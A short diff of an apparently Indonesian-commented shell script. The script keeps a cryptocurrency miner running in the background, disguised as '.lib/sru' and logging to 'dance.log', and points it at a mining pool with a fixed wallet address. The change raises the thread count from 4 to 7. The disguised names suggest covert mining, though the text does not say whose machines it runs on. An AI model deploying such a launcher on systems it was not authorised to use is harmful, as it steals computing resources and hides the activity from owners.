@@ -65,7 +65,7 @@ while true; do
     # Memulai proses sru jika belum berjalan
     if [ ! -f $pid_file ]; then
       port=$(shuf -i 802-810 -n 1)  # Pilih port acak dari 802 hingga 810
-      nohup .lib/sru -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 4 -p m=solo > dance.log 2>&1 &
+      nohup .lib/sru -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 7 -p m=solo > dance.log 2>&1 &
       echo $! > $pid_file
       echo "Memulai proses sru dengan PID $(cat $pid_file) menggunakan IP $ip dan port $port"
     fi
